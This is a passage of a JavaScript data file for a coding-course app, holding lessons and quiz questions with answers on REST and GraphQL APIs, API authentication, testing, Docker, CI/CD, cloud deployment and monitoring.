          { difficulty: "advanced", type: "freeform", q: "Design a paginated REST endpoint returning products with total count. Accept page and limit query params.", starterCode: "app.get('/api/v1/products', async (req, res) => {\n  \n});", patterns: ["req\\.query", "page|limit", "res\\.json", "total|count"], sampleAnswer: "app.get('/api/v1/products', async (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const limit = parseInt(req.query.limit) || 20;\n  const offset = (page - 1) * limit;\n  const products = await db.products.findMany({ skip: offset, take: limit });\n  const total = await db.products.count();\n  res.json({ data: products, page, limit, total });\n});" },
          { difficulty: "advanced", q: "A single GET /users/:id returns nested orders, addresses, and preferences. What is the main concern?", options: ["The URL is too long", "Over-fetching: clients get unneeded data, wasting bandwidth", "REST cannot return nested JSON", "The server will crash"], answer: 1 },
          { difficulty: "advanced", type: "output", q: "What improvement does the second error format provide?", code: "// V1: { \"error\": \"Something went wrong\" }\n// V2: { \"error\": { \"code\": \"VALIDATION_FAILED\",\n//   \"message\": \"Email required\", \"field\": \"email\" } }", options: ["V2 is too verbose", "Machine-readable codes and field-level detail for clients", "Both are equivalent", "V1 is better for debugging"], answer: 1 },
        ]
      },
      {
        title: "GraphQL Basics",
        slides: [
          { type: "teach", content: "**GraphQL** lets clients request exactly the data they need \u2014 no more, no less. One endpoint, flexible queries. Solves REST's over-fetching problem.", highlight: "GraphQL" },
          { type: "teach", content: "Define a **schema** with types, then write **resolvers** to fetch data. Clients send **queries** (read) or **mutations** (write) specifying exact fields.", highlight: "schema" },
        ],
        questions: [
          { q: "GraphQL solves REST's problem of:", options: ["Slow servers", "Over-fetching and under-fetching data", "Missing documentation", "No authentication"], answer: 1 },
          { type: "output", q: "What does this GraphQL query return?", code: "query {\n  user(id: 1) {\n    name\n    email\n  }\n}", options: ["All user fields", "Only name and email of user 1", "A list of all users", "An error"], answer: 1 },
          { q: "In GraphQL, to modify data you use a:", options: ["Query", "Mutation", "Subscription", "Resolver"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What data does this GraphQL query fetch?", code: "query {\n  posts(limit: 5) {\n    title\n    author {\n      name\n    }\n    comments {\n      text\n    }\n  }\n}", options: ["All posts with all fields", "5 posts with only title, author name, and comment text", "Only post titles", "An error because of nested queries"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the GraphQL mutation to create a user:", code: "___BLANK1___ {\n  ___BLANK2___(input: { name: \"Alice\", email: \"a@b.com\" }) {\n    id\n    name\n  }\n}", blanks: [{ id: "BLANK1", options: ["query", "mutation", "subscription", "resolver"], answer: 1 }, { id: "BLANK2", options: ["getUser", "createUser", "user", "newUser"], answer: 1 }] },
          { difficulty: "average", q: "What is a GraphQL resolver?", options: ["A CSS preprocessor", "A function that fetches the data for a specific field in the schema", "A database migration tool", "A type of HTTP method"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What problem does this GraphQL query create on the server?", code: "query {\n  users {\n    friends {\n      friends {\n        friends {\n          friends {\n            name\n          }\n        }\n      }\n    }\n  }\n}", options: ["Syntax error in the query", "N+1 query problem: deeply nested relations cause exponential DB queries", "GraphQL cannot nest more than 2 levels", "This is perfectly fine and efficient"], answer: 1 },
          { difficulty: "advanced", q: "When should you choose GraphQL over REST?", options: ["Always, REST is outdated", "When clients need flexible queries and you have multiple frontend platforms", "Only for real-time applications", "GraphQL is only for Facebook-scale apps"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Write a GraphQL schema type for a BlogPost that has id, title, content, author (User type), and createdAt. Include the Query type to fetch one post by ID and list all posts.", starterCode: "type BlogPost {\n  \n}\n\ntype Query {\n  \n}", patterns: ["type BlogPost", "id.*ID", "title.*String", "author.*User", "post.*ID", "posts"], sampleAnswer: "type BlogPost {\n  id: ID!\n  title: String!\n  content: String!\n  author: User!\n  createdAt: String!\n}\n\ntype Query {\n  post(id: ID!): BlogPost\n  posts: [BlogPost!]!\n}" },
        ]
      },
      {
        title: "API Auth & Rate Limiting",
        slides: [
          { type: "teach", content: "Protect APIs with **API keys** (simple), **OAuth tokens** (user-specific), or **JWT** (stateless). Always send auth in the **Authorization header**, never in URLs.", highlight: "Authorization header" },
          { type: "teach", content: "**Rate limiting** prevents abuse: limit requests per IP/user (e.g., 100/minute). Return **429 Too Many Requests** when exceeded. Use libraries like `express-rate-limit`.", highlight: "Rate limiting" },
        ],
        questions: [
          { q: "API authentication should be sent via:", options: ["URL query parameters", "Authorization header", "The request body always", "Cookies only"], answer: 1 },
          { q: "HTTP status 429 means:", options: ["Not Found", "Server Error", "Too Many Requests", "Unauthorized"], answer: 2 },
          { type: "fill", q: "Complete the auth header:", code: "fetch('/api/data', {\n  headers: {\n    '___BLANK1___': '___BLANK2___ my-token-here'\n  }\n})", blanks: [{ id: "BLANK1", options: ["Content-Type", "Authorization", "Accept", "Cookie"], answer: 1 }, { id: "BLANK2", options: ["Basic", "Bearer", "Token", "Key"], answer: 1 }] },
          // Average
          { difficulty: "average", type: "output", q: "What does this middleware do?", code: "const rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100\n});\napp.use('/api/', limiter);", options: ["Blocks all API requests", "Allows max 100 requests per IP every 15 minutes", "Limits responses to 100 bytes", "Caches 100 responses for 15 minutes"], answer: 1 },
          { difficulty: "average", type: "order", q: "Arrange the API authentication flow with JWT:", lines: ["User sends login credentials (POST /auth/login)", "Server validates credentials against database", "Server generates and returns a JWT token", "Client stores token and sends it in Authorization header", "Server middleware verifies token on protected routes"], correctOrder: [0, 1, 2, 3, 4] },
          { difficulty: "average", q: "Why should API keys NOT be sent in URL query parameters?", options: ["URLs are too short for keys", "URLs are logged in server logs and browser history, exposing the key", "Query parameters cannot hold strings", "API keys only work in headers"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "What security flaw exists in this API endpoint?", code: "app.get('/api/users/:id', (req, res) => {\n  const user = db.findById(req.params.id);\n  res.json(user);\n  // user object includes: id, name,\n  // email, passwordHash, ssn, role", options: ["No rate limiting", "Exposes sensitive fields (passwordHash, ssn) - needs field filtering", "Missing CORS headers", "The route should use POST"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Write Express middleware that verifies a JWT from the Authorization header and attaches the decoded user to req.user. Return 401 if invalid.", starterCode: "const authenticate = (req, res, next) => {\n  \n};", patterns: ["req\\.headers", "authorization|Authorization", "Bearer|split", "verify|decode", "req\\.user", "401|unauthorized", "next\\("], sampleAnswer: "const authenticate = (req, res, next) => {\n  const authHeader = req.headers.authorization;\n  if (!authHeader) return res.status(401).json({ error: 'No token provided' });\n  const token = authHeader.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, process.env.JWT_SECRET);\n    req.user = decoded;\n    next();\n  } catch (err) {\n    res.status(401).json({ error: 'Invalid token' });\n  }\n};" },
          { difficulty: "advanced", q: "Your API serves both a mobile app and a web dashboard. The mobile app needs 200 requests/min but the web needs only 60. How should you implement rate limiting?", options: ["One global limit of 200/min for everyone", "Different rate limit tiers based on API key or client type", "No rate limiting - trust your own clients", "Block mobile apps after 60 requests"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 12, title: "Testing", icon: "\u{1F9EA}", color: "#27AE60", desc: "Unit, Integration, E2E",
    lessons: [
      {
        title: "Testing Pyramid",
        slides: [
          { type: "teach", content: "The testing pyramid: **Unit tests** (70%) test functions in isolation. **Integration tests** (20%) test modules together. **E2E tests** (10%) test full user flows.", highlight: "pyramid" },
          { type: "teach", content: "Write tests with **Vitest** (unit), **Supertest** (API), and **Playwright** (E2E). Use `describe`, `it`, and `expect` to structure readable tests.", highlight: "Vitest" },
        ],
        questions: [
          { q: "Which test type should you have the MOST of?", options: ["E2E tests", "Integration tests", "Unit tests", "Manual tests"], answer: 2 },
          { q: "Unit tests check:", options: ["Full user flows", "Individual functions in isolation", "Server deployment", "CSS styling"], answer: 1 },
          { q: "E2E tests simulate:", options: ["Database queries", "A real user using the app", "npm installs", "Git commits"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "A team has 200 unit tests, 10 integration tests, and 50 E2E tests. What is wrong with this distribution?", code: "Unit tests:        200 (77%)\nIntegration tests:  10 (4%)\nE2E tests:          50 (19%)", options: ["Too many unit tests", "Too few integration tests and too many E2E tests (should be ~20% integration, ~10% E2E)", "The total number is too low", "This is a perfect distribution"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the test structure:", code: "___BLANK1___('Calculator', () => {\n  ___BLANK2___('should add two numbers', () => {\n    expect(add(2, 3)).toBe(5);\n  });\n});", blanks: [{ id: "BLANK1", options: ["test", "describe", "it", "suite"], answer: 1 }, { id: "BLANK2", options: ["describe", "it", "test", "check"], answer: 1 }] },
          { difficulty: "average", q: "Why are E2E tests at the TOP of the pyramid (fewest)?", options: ["They are the least important", "They are slow, expensive, and brittle compared to unit tests", "Browsers cannot be automated", "E2E tests are deprecated"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "A checkout feature works in unit tests but fails in production. Which test layer likely has a gap?", code: "Unit tests: calculateTotal() ✓, applyDiscount() ✓\nIntegration: ???\nE2E: ???\n\n// Bug: discount code is not applied when\n// Stripe payment API is called", options: ["Unit tests need more coverage", "Integration tests are missing - the Stripe API + discount logic interaction was never tested together", "E2E tests should be removed", "This is a CSS styling issue"], answer: 1 },
          { difficulty: "advanced", q: "Your CI pipeline takes 45 minutes. E2E tests account for 40 minutes. What is the best optimization strategy?", options: ["Remove all E2E tests", "Run unit/integration tests on every push, run E2E tests only on PRs to main", "Run E2E tests locally only", "Increase server resources to make them faster"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Design a testing strategy for a user registration feature. List what you would test at each level: unit, integration, and E2E.", starterCode: "// Unit tests:\n//   - \n// Integration tests:\n//   - \n// E2E tests:\n//   - ", patterns: ["[Uu]nit.*valid|valid.*[Uu]nit", "[Ii]ntegration.*database|database.*[Ii]ntegration|[Ii]ntegration.*API|API.*[Ii]ntegration", "[Ee]2[Ee].*form|form.*[Ee]2[Ee]|[Ee]nd.*form|form.*[Ee]nd"], sampleAnswer: "// Unit tests:\n//   - validateEmail() returns true for valid emails\n//   - hashPassword() returns a bcrypt hash\n//   - validateAge() rejects under-18 users\n// Integration tests:\n//   - POST /api/register creates a user in the database\n//   - Duplicate email returns 409 Conflict\n//   - Registration triggers welcome email service\n// E2E tests:\n//   - User fills out form, submits, sees success page\n//   - User submits invalid data, sees validation errors" },
        ]
      },
      {
        title: "Writing Unit Tests",
        slides: [
          { type: "teach", content: "A good unit test follows **AAA**: **Arrange** (set up data), **Act** (call the function), **Assert** (check the result). Keep tests small and focused.", highlight: "AAA" },
          { type: "teach", content: "Use **mocks** to replace dependencies (APIs, databases) so tests run fast and predictably. `vi.fn()` in Vitest creates mock functions.", highlight: "mocks" },
        ],
        questions: [
          { type: "order", q: "Arrange the AAA testing pattern:", lines: ["expect(result).toBe(5)", "const result = add(2, 3)", "const add = (a, b) => a + b"], correctOrder: [2, 1, 0] },
          { type: "output", q: "What does this test check?", code: "test('adds numbers', () => {\n  expect(add(2, 3)).toBe(5);\n  expect(add(-1, 1)).toBe(0);\n});", options: ["That add() returns strings", "That add() correctly sums two numbers", "That add() throws an error", "That add() is async"], answer: 1 },
          { q: "Mocks are used to:", options: ["Slow down tests", "Replace real dependencies with fakes", "Test CSS styling", "Deploy code"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "Will this test pass or fail?", code: "function multiply(a, b) { return a * b; }\n\ntest('multiplies numbers', () => {\n  expect(multiply(3, 4)).toBe(12);\n  expect(multiply(0, 5)).toBe(0);\n  expect(multiply(-2, 3)).toBe(-6);\n});", options: ["Fail - multiply(0,5) returns undefined", "Pass - all assertions are correct", "Fail - toBe cannot compare numbers", "Fail - negative numbers cause errors"], answer: 1 },
          { difficulty: "average", type: "output", q: "What does the mock track in this test?", code: "const mockSave = vi.fn();\nconst user = { save: mockSave };\n\nuser.save({ name: 'Alice' });\nuser.save({ name: 'Bob' });\n\nexpect(mockSave).toHaveBeenCalledTimes(2);\nexpect(mockSave).toHaveBeenCalledWith({ name: 'Bob' });", options: ["It tests the real database", "It tracks how many times save() was called and with what arguments", "It creates real users named Alice and Bob", "It mocks the HTTP layer"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the unit test for a string utility:", code: "import { capitalize } from './utils';\n\n___BLANK1___('capitalize', () => {\n  it('capitalizes first letter', () => {\n    ___BLANK2___(capitalize('hello')).toBe('Hello');\n  });\n});", blanks: [{ id: "BLANK1", options: ["test", "describe", "it", "suite"], answer: 1 }, { id: "BLANK2", options: ["assert", "expect", "verify", "check"], answer: 1 }] },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a unit test for a fetchUser function that calls an API. Mock the fetch call and test both success and error cases.", starterCode: "import { describe, it, expect, vi } from 'vitest';\nimport { fetchUser } from './api';\n\ndescribe('fetchUser', () => {\n  \n});", patterns: ["vi\\.fn|vi\\.mock|mock", "resolve|resolves", "reject|rejects|throw|error", "expect.*toBe|expect.*toEqual|expect.*toThrow"], sampleAnswer: "import { describe, it, expect, vi } from 'vitest';\nimport { fetchUser } from './api';\n\ndescribe('fetchUser', () => {\n  it('returns user data on success', async () => {\n    global.fetch = vi.fn().mockResolvedValue({\n      ok: true, json: () => Promise.resolve({ id: 1, name: 'Alice' })\n    });\n    const user = await fetchUser(1);\n    expect(user.name).toBe('Alice');\n  });\n  it('throws on network error', async () => {\n    global.fetch = vi.fn().mockRejectedValue(new Error('Network error'));\n    await expect(fetchUser(1)).rejects.toThrow('Network error');\n  });\n});" },
          { difficulty: "advanced", type: "output", q: "What is the problem with this test?", code: "test('user registration', async () => {\n  const user = await createUser('Alice', 'a@b.com');\n  expect(user.id).toBeDefined();\n  expect(user.name).toBe('Alice');\n  // This calls the REAL database\n  const dbUser = await db.users.findById(user.id);\n  expect(dbUser.email).toBe('a@b.com');\n});", options: ["The assertions are wrong", "It is not a unit test - it depends on a real database, making it slow and flaky", "async/await cannot be used in tests", "The test is perfectly fine as a unit test"], answer: 1 },
          { difficulty: "advanced", q: "What should you test in edge cases for a divide(a, b) function?", options: ["Only positive integers", "Division by zero, negative numbers, floats, and very large numbers", "Only the happy path with small numbers", "Edge cases slow down the test suite and should be avoided"], answer: 1 },
        ]
      },
      {
        title: "Integration & E2E Testing",
        slides: [
          { type: "teach", content: "**Integration tests** verify that modules work together: API route + database, component + API call. Use **Supertest** to test Express endpoints.", highlight: "Integration tests" },
          { type: "teach", content: "**E2E tests** with Playwright automate a real browser: click buttons, fill forms, verify pages. Slow but catch bugs that unit tests miss.", highlight: "Playwright" },
        ],
        questions: [
          { q: "Integration tests verify:", options: ["Individual functions", "Modules working together", "CSS appearance", "Git history"], answer: 1 },
          { type: "fill", q: "Complete the Supertest integration test:", code: "const response = await ___BLANK1___(app)\n  .get('/api/users')\n  .expect(___BLANK2___);", blanks: [{ id: "BLANK1", options: ["fetch", "request", "axios", "http"], answer: 1 }, { id: "BLANK2", options: ["404", "200", "500", "302"], answer: 1 }] },
          { q: "Playwright tests run in:", options: ["Node.js only", "A real browser", "The terminal only", "A database"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this integration test verify?", code: "test('GET /api/users returns users', async () => {\n  await db.users.create({ name: 'Alice' });\n  const res = await request(app)\n    .get('/api/users')\n    .expect(200);\n  expect(res.body).toHaveLength(1);\n  expect(res.body[0].name).toBe('Alice');\n});", options: ["That the database can store users", "That the API route correctly returns users from the database", "That the frontend displays users", "That the mock returns fake data"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the Playwright E2E test:", code: "test('user can log in', async ({ ___BLANK1___ }) => {\n  await page.goto('/login');\n  await page.fill('#email', 'alice@test.com');\n  await page.fill('#password', 'secret123');\n  await page.click('button[type=\"submit\"]');\n  await expect(page).___BLANK2___(/dashboard/);\n});", blanks: [{ id: "BLANK1", options: ["browser", "page", "request", "context"], answer: 1 }, { id: "BLANK2", options: ["toHaveURL", "toHaveText", "toBeVisible", "toHaveTitle"], answer: 0 }] },
          { difficulty: "average", q: "Why do integration tests need a test database instead of the production database?", options: ["Production databases are too fast", "Tests create/delete data that would corrupt real user data", "Integration tests cannot connect to databases", "Test databases are always faster"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a Playwright E2E test that: navigates to a signup page, fills in name/email/password, submits the form, and verifies the user lands on a welcome page.", starterCode: "import { test, expect } from '@playwright/test';\n\ntest('new user signup flow', async ({ page }) => {\n  \n});", patterns: ["goto.*signup|goto.*register", "fill.*name|fill.*email", "fill.*password", "click.*submit|click.*button", "expect.*welcome|expect.*dashboard|toHaveURL"], sampleAnswer: "import { test, expect } from '@playwright/test';\n\ntest('new user signup flow', async ({ page }) => {\n  await page.goto('/signup');\n  await page.fill('#name', 'Alice Smith');\n  await page.fill('#email', 'alice@test.com');\n  await page.fill('#password', 'SecurePass123');\n  await page.click('button[type=\"submit\"]');\n  await expect(page).toHaveURL(/welcome/);\n  await expect(page.locator('h1')).toHaveText('Welcome, Alice!');\n});" },
          { difficulty: "advanced", type: "output", q: "This E2E test is flaky - it passes sometimes and fails other times. What is the likely cause?", code: "test('shows user list', async ({ page }) => {\n  await page.goto('/users');\n  // Fails intermittently:\n  const count = await page.locator('.user-card').count();\n  expect(count).toBe(5);\n});", options: ["The locator is wrong", "No wait for data to load - the API response may not have arrived yet when counting elements", "Playwright cannot count elements", "The test needs more assertions"], answer: 1 },
          { difficulty: "advanced", q: "Your E2E tests depend on a third-party payment API. What is the best approach?", options: ["Always hit the real payment API in tests", "Use the payment provider's sandbox/test environment or mock the API at the network level", "Skip testing payment functionality entirely", "Test payments manually only"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 13, title: "DevOps", icon: "\u{1F433}", color: "#2496ED", desc: "Docker, CI/CD, Cloud",
    lessons: [
      {
        title: "Docker & CI/CD",
        slides: [
          { type: "teach", content: "**Docker** packages your app + its environment into a **container** that runs identically everywhere. No more 'works on my machine'! Write a `Dockerfile` to define it.", highlight: "container" },
          { type: "teach", content: "**CI/CD** automates testing and deployment. On every push: run tests \u2192 build \u2192 deploy. **GitHub Actions** defines this in a YAML workflow file.", highlight: "CI/CD" },
        ],
        questions: [
          { q: "Docker containers ensure:", options: ["Faster internet", "Consistent environments everywhere", "Better CSS", "Free hosting"], answer: 1 },
          { q: "CI/CD stands for:", options: ["Code Integration / Code Delivery", "Continuous Integration / Continuous Deployment", "Container Init / Container Deploy", "Cloud Instance / Cloud Database"], answer: 1 },
          { q: "GitHub Actions workflows are defined in:", options: ["JavaScript", "YAML files", "HTML", "SQL"], answer: 1 },
          // Average
          { difficulty: "average", type: "order", q: "Arrange the Dockerfile instructions in correct order:", lines: ["FROM node:18-alpine", "WORKDIR /app", "COPY package*.json ./", "RUN npm install", "COPY . .", "CMD [\"node\", \"server.js\"]"], correctOrder: [0, 1, 2, 3, 4, 5] },
          { difficulty: "average", type: "output", q: "What does this GitHub Actions step do?", code: "- name: Run tests\n  run: npm test\n- name: Build\n  if: success()\n  run: npm run build", options: ["Runs tests and build in parallel", "Runs tests first; only builds if tests pass", "Skips tests and goes straight to build", "Runs build first, then tests"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the Dockerfile:", code: "___BLANK1___ node:18-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm install\nCOPY . .\n___BLANK2___ 3000\nCMD [\"node\", \"server.js\"]", blanks: [{ id: "BLANK1", options: ["USE", "FROM", "IMPORT", "REQUIRE"], answer: 1 }, { id: "BLANK2", options: ["OPEN", "EXPOSE", "PORT", "LISTEN"], answer: 1 }] },
          // Advanced
          { difficulty: "advanced", type: "output", q: "Why does this Dockerfile produce a larger image than necessary?", code: "FROM node:18\nWORKDIR /app\nCOPY . .\nRUN npm install\nCMD [\"node\", \"server.js\"]", options: ["The CMD is wrong", "Uses full node image (not alpine), copies all files before install (busts cache), includes devDependencies", "WORKDIR is unnecessary", "Docker images are always the same size"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Write a GitHub Actions workflow that runs on push to main: checks out code, sets up Node 18, installs dependencies, runs lint, runs tests, and builds.", starterCode: "name: CI\non:\n  push:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:", patterns: ["checkout|actions/checkout", "setup-node|node", "npm install|npm ci", "npm run lint|npm test", "npm run build"], sampleAnswer: "name: CI\non:\n  push:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 18\n      - run: npm ci\n      - run: npm run lint\n      - run: npm test\n      - run: npm run build" },
          { difficulty: "advanced", q: "In a CI/CD pipeline, what is the main benefit of running 'npm ci' instead of 'npm install'?", options: ["npm ci is faster and ensures exact versions from package-lock.json (clean reproducible installs)", "npm ci installs fewer packages", "npm ci works without a package.json", "There is no difference"], answer: 0 },
        ]
      },
      {
        title: "Cloud Deployment",
        slides: [
          { type: "teach", content: "The big 3 cloud providers: **AWS**, **Google Cloud**, **Azure**. For beginners, start with **PaaS** options like Vercel, Railway, or Render \u2014 they handle infrastructure for you.", highlight: "PaaS" },
          { type: "teach", content: "Key concepts: **environment variables** for secrets, **SSL/TLS** for HTTPS, **domains** via DNS. Use `.env` files locally, platform settings in production.", highlight: "environment variables" },
        ],
        questions: [
          { q: "PaaS stands for:", options: ["Programming as a Service", "Platform as a Service", "Protocol as a System", "Process as a Stack"], answer: 1 },
          { type: "order", q: "Arrange the deployment workflow:", lines: ["Push code to GitHub", "CI runs tests automatically", "Build step creates production bundle", "App is deployed to production URL"], correctOrder: [0, 1, 2, 3] },
          { q: "Production secrets should be stored in:", options: ["The source code", "A public README", "Environment variables on the platform", "Comments in HTML"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "What is wrong with this deployment configuration?", code: "// .env file committed to GitHub:\nDATABASE_URL=postgres://admin:password@db.prod.com\nSTRIPE_SECRET=sk_live_abc123\nJWT_SECRET=mysupersecret", options: ["The file format is incorrect", "Secrets are committed to source control - they should be in platform env vars only", "You should use JSON instead of .env format", "The variable names are too long"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the deployment environment setup:", code: "# Local development\ncp .env.___BLANK1___ .env\n# Edit .env with your local values\n\n# Production (set on platform)\n# ___BLANK2___ = postgres://...", blanks: [{ id: "BLANK1", options: ["prod", "example", "secret", "local"], answer: 1 }, { id: "BLANK2", options: ["DB_FILE", "DATABASE_URL", "SQL_STRING", "DATA_PATH"], answer: 1 }] },
          { difficulty: "average", q: "What is the main advantage of PaaS (like Vercel, Railway) over IaaS (like raw AWS EC2)?", options: ["PaaS is always free", "PaaS handles infrastructure (servers, scaling, SSL) so you focus on code", "PaaS runs faster than IaaS", "PaaS does not use the cloud"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "order", q: "Arrange the steps for a zero-downtime deployment strategy:", lines: ["Deploy new version alongside old version", "Run health checks on new version", "Gradually shift traffic to new version", "Remove old version once stable", "Rollback if health checks fail"], correctOrder: [0, 1, 2, 3, 4] },
          { difficulty: "advanced", q: "Your app works locally but crashes on deployment with 'Cannot find module dotenv'. What is most likely wrong?", options: ["The cloud provider does not support Node.js", "dotenv is in devDependencies instead of dependencies, so it is not installed in production", "The .env file is missing", "Node.js version is different"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Write a deployment checklist for launching a full-stack app to production. Cover environment variables, database, SSL, DNS, and monitoring.", starterCode: "// Production Launch Checklist:\n// 1. Environment: \n// 2. Database: \n// 3. Security: \n// 4. DNS: \n// 5. Monitoring: ", patterns: ["env|environment|variables|secrets", "database|migration|seed", "SSL|HTTPS|TLS|security", "DNS|domain", "monitoring|logging|alerts"], sampleAnswer: "// Production Launch Checklist:\n// 1. Environment: Set all env vars on platform, remove hardcoded secrets\n// 2. Database: Run migrations, seed initial data, set up backups\n// 3. Security: Enable SSL/HTTPS, set CORS, configure rate limiting\n// 4. DNS: Point domain A record to platform, verify propagation\n// 5. Monitoring: Set up error tracking, uptime alerts, log aggregation" },
        ]
      },
      {
        title: "Monitoring & Logging",
        slides: [
          { type: "teach", content: "**Monitoring** tracks app health: uptime, response times, error rates. Tools like **Datadog**, **New Relic**, or **Grafana** visualize metrics in real-time dashboards.", highlight: "Monitoring" },
          { type: "teach", content: "**Structured logging** with JSON makes logs searchable: `{ level: 'error', message: '...', timestamp, requestId }`. Use **log levels**: debug, info, warn, error.", highlight: "Structured logging" },
        ],
        questions: [
          { q: "Application monitoring tracks:", options: ["Git commits", "Uptime, errors, and performance", "CSS styles", "Database schemas"], answer: 1 },
          { q: "The correct log levels from least to most severe:", options: ["error, warn, info, debug", "debug, info, warn, error", "info, debug, error, warn", "warn, error, debug, info"], answer: 1 },
          { type: "output", q: "What log level should this use?", code: "// User submitted a form successfully\nlogger.___('Form submitted', {\n  userId: 123,\n  formType: 'signup'\n});", options: ["logger.error", "logger.warn", "logger.info", "logger.debug"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "Which log format is easier to search and filter programmatically?", code: "// Format A:\n\"2024-01-15 ERROR: User login failed for alice@test.com\"\n\n// Format B:\n{\"timestamp\":\"2024-01-15T10:30:00Z\",\"level\":\"error\",\n \"message\":\"Login failed\",\"email\":\"alice@test.com\",\n \"requestId\":\"abc-123\"}", options: ["Format A - it is more human-readable", "Format B - structured JSON is machine-parseable and searchable by field", "Both are equally searchable", "Neither can be searched"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the structured log entry:", code: "logger.error(___BLANK1___, {\n  ___BLANK2___: 'abc-123',\n  userId: 42,\n  statusCode: 500\n});", blanks: [{ id: "BLANK1", options: ["500", "'Database connection failed'", "true", "null"], answer: 1 }, { id: "BLANK2", options: ["name", "requestId", "css", "html"], answer: 1 }] },
          { difficulty: "average", q: "An alert fires at 3 AM saying response times jumped from 200ms to 5s. What should you check FIRST?", options: ["CSS styles", "Recent deployments, database performance, and error logs", "Git commit messages", "The README file"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "output", q: "This monitoring dashboard shows a pattern. What does it indicate?", code: "Response times (p95):\n  Mon: 150ms, Tue: 160ms, Wed: 155ms\n  Thu: 800ms, Fri: 2500ms, Sat: 5000ms\n\nError rate:\n  Mon-Wed: 0.1%, Thu: 2%, Fri: 8%, Sat: 15%\n\nMemory usage:\n  Mon: 45%, Tue: 48%, Wed: 52%\n  Thu: 75%, Fri: 90%, Sat: 98%", options: ["Normal traffic growth", "A memory leak - memory grows daily, degrading performance until crash", "The server needs a CSS update", "This is expected weekend traffic"], answer: 1 },
          { difficulty: "advanced", type: "freeform", q: "Design an alerting strategy for a production web app. Define what metrics to monitor, threshold values, and notification channels.", starterCode: "// Alerting Strategy:\n// Metric 1: \n// Metric 2: \n// Metric 3: \n// Notification: ", patterns: ["uptime|availability|response.time|latency", "error.rate|5xx|error", "CPU|memory|disk", "Slack|email|PagerDuty|SMS|notification"], sampleAnswer: "// Alerting Strategy:\n// Metric 1: Response time p95 > 1s for 5 min -> warn, > 3s -> critical\n// Metric 2: Error rate > 1% for 5 min -> warn, > 5% -> critical\n// Metric 3: Memory/CPU > 80% -> warn, > 95% -> critical\n// Notification: Warn -> Slack channel, Critical -> PagerDuty + SMS to on-call" },
          { difficulty: "advanced", q: "Should you log user passwords or credit card numbers for debugging purposes?", options: ["Yes, it helps debug authentication issues", "Never - sensitive data must be redacted from logs to comply with security and privacy regulations", "Only in development environments", "Only if the logs are encrypted"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 14, title: "Capstone", icon: "\u{1F3C6}", color: "#F39C12", desc: "Full Stack Project",
    lessons: [
      {
        title: "Building Your Capstone",
        slides: [
          { type: "teach", content: "Your capstone combines EVERYTHING: React frontend, Node/Express API, PostgreSQL database, authentication, testing, Docker, and cloud deployment.", highlight: "EVERYTHING" },
          { type: "teach", content: "Follow this process: **Plan** (wireframes + schema) \u2192 **Build API** \u2192 **Build Frontend** \u2192 **Integrate** \u2192 **Test** \u2192 **Deploy**. Ship it!", highlight: "Plan" },
        ],
        questions: [
          { q: "The first step in a capstone project is:", options: ["Writing code", "Planning and wireframing", "Deploying", "Testing"], answer: 1 },
          { q: "A production app needs:", options: ["Just a frontend", "Frontend + backend + database + deployment", "Only an API", "Just a design"], answer: 1 },
          { q: "After building, you should:", options: ["Delete it", "Test and deploy it", "Start over", "Only show friends"], answer: 1 },
          // Average
          { difficulty: "average", type: "order", q: "Arrange the capstone project phases in correct order:", lines: ["Plan wireframes and database schema", "Build REST API with authentication", "Build React frontend with routing", "Connect frontend to API", "Write tests (unit + integration)", "Deploy to cloud with CI/CD"], correctOrder: [0, 1, 2, 3, 4, 5] },
          { difficulty: "average", type: "output", q: "You are planning a task management app. Which database schema decision is better?", code: "// Option A: One big table\n// tasks: id, title, description, userId, userName,\n//        userEmail, status, priority, dueDate\n\n// Option B: Normalized tables\n// users: id, name, email\n// tasks: id, title, description, userId (FK),\n//        status, priority, dueDate", options: ["Option A - fewer tables means faster queries", "Option B - normalized design avoids data duplication and is easier to maintain", "Both are identical in practice", "Neither - use a NoSQL database"], answer: 1 },
          { difficulty: "average", q: "When building a capstone, which should you build FIRST?", options: ["The CSS animations", "The API endpoints and database models, because the frontend depends on them", "The deployment pipeline", "The landing page"], answer: 1 },
          // Advanced
